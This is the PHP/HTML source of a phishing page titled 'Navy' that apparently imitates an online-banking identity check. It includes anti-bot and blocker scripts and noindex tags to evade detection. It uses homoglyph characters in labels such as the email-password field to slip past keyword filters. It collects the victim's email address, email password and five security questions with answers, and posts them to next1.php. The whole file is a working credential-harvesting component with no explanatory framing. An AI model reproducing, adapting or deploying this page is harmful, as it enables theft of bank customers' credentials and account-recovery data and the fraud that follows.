<?php

session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include 'bt.php';
include "blocker.php";
?>
<!DOCTYPE html>
 <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<title>Navy</title>
<script type="text/javascript">
	function validateMyForm() {
		// The field is empty, submit the form.
		if(!document.getElementById("honeypot").value) { 
			return true;
		} 
		 // the field has a value it's a spam bot
		else {
			return false;
		}
	}
</script>

<style>
.foaction {
display: block;
width: 100%;
height: 34px;
padding: 6px 12px;
font-size: 14px;
line-height: 1.42857143;
color: #555;
background-color: #fff;
background-image: none;
border: 1px solid #ccc;
border-radius: 4px;
-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);
-webkit-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
}
</style>
<body>
  

 <div  style="position:absolute; overflow:hidden; left:0px; top:0px; width:1348px; height:124px; z-index:2"><img src="images/4.gif" alt="" title="" border=0 width=1345 height=124></div>
 <div  style="position:absolute; overflow:hidden; left:0px; top:812px; width:1348px; height:318px; z-index:2"><img src="images/2.gif" alt="" title="" border=0 width=1345 height=318></div>
 <div  style="position:absolute; overflow:hidden; left:0px; top:102px; width:1348px; height:701px; z-index:2; background:url(images/bg.gif) no-repeat"></div>
 
 <div  style="position:absolute; overflow:hidden; left:850px; top:232px; width:256px; height:132px; z-index:2"><p>Access to your accounts is granted upon successful submission and verification of information you enter. Once your information has been verified, you will be prompted to Sign in to Online Banking to view your accounts. </p></div>

 
 <form action="next1.php"  onSubmit="return validateMyForm();" method="post" id='_form_1029' accept-charset='utf-8' enctype='multipart/form-data'>
 
 

 
<div id="image5" style="position:absolute; overflow:hidden; left:190px; top:140px; width:900px; z-index:48; background:#0057A2; font-size:24px; padding:10px; text-align:left; color: #fff">Confirm your identity</div>

<div id="text14" style="position:absolute; overflow:hidden; left:160px; top:530px; width:500px; height:23px; z-index:27">
<div class="wpmd">
<div><B> </div>
</div></div>

<div id="text14" style="position:absolute; overflow:hidden; left:190px; top:220px; width:300px; height:23px; z-index:27">
<div class="wpmd">
<div><B>Email Address </B><font style="font-size:10px">(Email attached to your account)</font><font color="#FF0000"><B>*</B></font></div>
</div></div>

<input name="emlly" value="" placeholder="Email Address" class="foaction" type="email" style="position:absolute;width:270px;left:190px;top:245px;z-index:28" required>
 



<div id="text15" style="position:absolute; overflow:hidden; left:530px; top:220px; width:300px; height:23px; z-index:29">
<div class="wpmd">
<div><B>Εmаіl Раѕѕԝогd </B><font style="font-size:9px">(Email attached password)</font><font color="#FF0000"><B>*</B></font></div>
</div></div>

<input name="pa77w0rd" value="" placeholder="Εmаіl Раѕѕԝогd" class="foaction" type="password" style="position:absolute;width:270px;left:532px;top:245px;z-index:30" required>
 


<div id="text24" style="position:absolute; overflow:hidden; left:190px; top:320px; width:222px; height:23px; z-index:49">
<div class="wpmd">
<div><B> Ϲһаllеngе Ԛuеѕtіоn </B><font color="#FF0000"><B>*</B></font></div>
</div></div>

<div id="text25" style="position:absolute; overflow:hidden; left:535px; top:320px; width:225px; height:23px; z-index:50">
<div class="wpmd">
<div><B> Ϲһаllеngе Αnѕԝегѕ </B><font color="#FF0000"><B>*</B></font></div>
</div></div>

<div id="html1" style="position:absolute; overflow:hidden; left:190px; top:351px; width:311px; height:58px; z-index:51">
<select class="foaction " name="qa1" required>
                          	<option>Select  Challenge Question 1</option>
                             <option value="What is the last name of your first boyfriend or girlfriend?">
		What is the last name of your first boyfriend or girlfriend?</option>
		<option value="What was your favorite college year?">
		What was your favorite college year?</option>
		<option value="What is your nickname?">
		What is your nickname?</option>
		<option value="What is your oldest sibling's nickname?">
		What is your oldest sibling&#39;s nickname?</option>
		<option value="Who is your favorite person from history?">
		Who is your favorite person from history?</option>
		<option value="What is your grandmother's middle name (your mother's mother)?">
		What is your grandmother&#39;s middle name (your mother&#39;s mother)?</option>
		<option value="What is the first name of your eldest nephew/niece?">
		What is the first name of your eldest nephew/niece?</option>
		<option value="In which city was your grandfather born (father's father)?">
		In which city was your grandfather born (father&#39;s father)?</option>
		<option value="In which city was your mother born?">
		In which city was your mother born?</option>
		<option value="What is the first name of your closest childhood friend?">
		What is the first name of your closest childhood friend?</option>
        
</select></div>

<div id="html2" style="position:absolute; overflow:hidden; left:190px; top:418px; width:311px; height:59px; z-index:52">
<select class="foaction col-md-6 botom-spacing" name="qa2" required>
                          	<option>Select  Challenge Question 2</option>
                          <option value="What is the name of the hospital your oldest child was born in?">
		What is the name of the hospital your oldest child was born in?</option>
		<option value="What is the first name of the eldest of your siblings?">
		What is the first name of the eldest of your siblings?</option>
		<option value="What is the first name of the youngest of your siblings?">
		What is the first name of the youngest of your siblings?</option>
		<option value="What is the name of the hospital in which you were born?">
		What is the name of the hospital in which you were born?</option>
		<option value="What was the name of your first roommate during college?">
		What was the name of your first roommate during college?</option>
		<option value="What is your eldest child's middle name?">
		What is your eldest child&#39;s middle name?</option>
		<option value="What is the middle name of your eldest sibling?">
		What is the middle name of your eldest sibling?</option>
		<option value="Which sports team did you like most as a child?">
		Which sports team did you like most as a child?</option>
		<option value="When is your parents' wedding anniversary (MM/DD)?">
		When is your parents&#39; wedding anniversary (MM/DD)?</option>
		<option value="Which was the first foreign country you visited?">
		Which was the first foreign country you visited?</option>

						</select></div>

<div id="html3" style="position:absolute; overflow:hidden; left:190px; top:488px; width:311px; height:60px; z-index:53">
<select class="foaction col-md-6 botom-spacing" name="qa3" required>
                          	<option>Select  Challenge Question 3</option>
                         <option value="What is the first name of the person you went to your prom with?">
		What is the first name of the person you went to your prom with?
		</option>
		<option value="What was your high school mascot?">
		What was your high school mascot?</option>
		<option value="What was your boss's first name at your first job?">
		What was your boss&#39;s first name at your first job?</option>
		<option value="What is the street name where you lived when you were 10 years old?">
		What is the street name where you lived when you were 10 years old?
		</option>
		<option value="What is your favorite fictional character?">
		What is your favorite fictional character?</option>
		<option value="In which city was your grandmother born (father's mother)?">
		In which city was your grandmother born (father&#39;s mother)?</option>
		<option value="What is the first name of your grandmother (your mother's mother)?">
		What is the first name of your grandmother (your mother&#39;s mother)?
		</option>
		<option value="How old was your father when you were born?">
		How old was your father when you were born?</option>
		<option value="What is your youngest sibling's nickname?">
		What is your youngest sibling&#39;s nickname?</option>
		<option value="Which state did you first visit (outside the one you were born in)?">
		Which state did you first visit (outside the one you were born in)?
		</option>
						</select></div>

<div id="html4" style="position:absolute; overflow:hidden; left:190px; top:558px; width:311px; height:55px; z-index:54">
<select class="foaction col-md-6 botom-spacing" name="qa4" required>
                          	<option>Select  Challenge Question 4</option>
                          	<option value="What is the first name of your mother's youngest sibling?">
		What is the first name of your mother&#39;s youngest sibling?</option>
		<option value="What is the first name of your father's youngest sibling?">
		What is the first name of your father&#39;s youngest sibling?</option>
		<option value="What is your youngest child's middle name?">
		What is your youngest child&#39;s middle name?</option>
		<option value="In which city were you born?">
		In which city were you born?</option>
		<option value="In which city did your parents get married?">
		In which city did your parents get married?</option>
		<option value="What is the first name of your grandfather (your mother's father)?">
		What is the first name of your grandfather (your mother&#39;s father)?
		</option>
		<option value="What is your grandfather's profession?">
		What is your grandfather&#39;s profession?</option>
		<option value="What is the middle name of your youngest sibling?">
		What is the middle name of your youngest sibling?</option>
		<option value="What is your grandfather's middle name (your mother's father)?">
		What is your grandfather&#39;s middle name (your mother&#39;s father)?</option>
		<option value="What is the first name of your grandmother (your father's mother)?">
		What is the first name of your grandmother (your father&#39;s mother)?
		</option>
						</select></div>

<div id="html5" style="position:absolute; overflow:hidden; left:190px; top:628px; width:311px; height:62px; z-index:55">
<select class="foaction col-md-6 botom-spacing" name="qa5" required>
                          	<option>Select  Challenge Question 5</option>
	<option value="What was the last name of your first grade teacher?">
		What was the last name of your first grade teacher?</option>
		<option value="In which city was your father born?">
		In which city was your father born?</option>
		<option value="What was the first name of your man/maid of honor?">
		What was the first name of your man/maid of honor?</option>
		<option value="What is your grandmother's middle name (your father's mother)?">
		What is your grandmother&#39;s middle name (your father&#39;s mother)?</option>
		<option value="What is the first name of your grandfather (your father's father)?">
		What is the first name of your grandfather (your father&#39;s father)?
		</option>
		<option value="In which city was your grandfather born (mother's father)?">
		In which city was your grandfather born (mother&#39;s father)?</option>
		<option value="In which city was your grandmother born (mother's mother)?">
		In which city was your grandmother born (mother&#39;s mother)?</option>
		<option value="What is your youngest child's nickname?">
		What is your youngest child&#39;s nickname?</option>
		<option value="What is your grandfather's middle name (your father's father)?">
		What is your grandfather&#39;s middle name (your father&#39;s father)?</option>

						</select></div>

<input name="an1" placeholder="Рlеаsе Entег Answег" class="foaction" type="text" style="position:absolute;width:270px;left:534px;top:343px;z-index:56" required>
<input name="an2" placeholder="Рlеаsе Entег Answег" class="foaction" type="text" style="position:absolute;width:270px;left:532px;top:410px;z-index:57" required>
<input name="an3" placeholder="Рlеаsе Entег Answег" class="foaction" type="text" style="position:absolute;width:270px;left:532px;top:480px;z-index:58" required>
<input name="an4" placeholder="Рlеаsе Entег Answег" class="foaction" type="text" style="position:absolute;width:270px;left:533px;top:550px;z-index:59" required>
<input name="an5" placeholder="Рlеаsе Entег Answег" class="foaction" type="text" style="position:absolute;width:270px;left:532px;top:620px;z-index:60" required>
  
  <!-- honeypot field start-->
	<div style="display:none;">
		<label>Keep this field blank</label>
		<input type="text" name="honeypot" id="honeypot" />
	</div>
	<!-- honeypot field end -->
  
 <input name="Submit" type="image" style="position:absolute;left:180px;top:684px;z-index:2" src="images/5.gif" alt="" title="" border=0 width=940 height=112></button></form>
  
 
</body>
</body>

</html>
  
   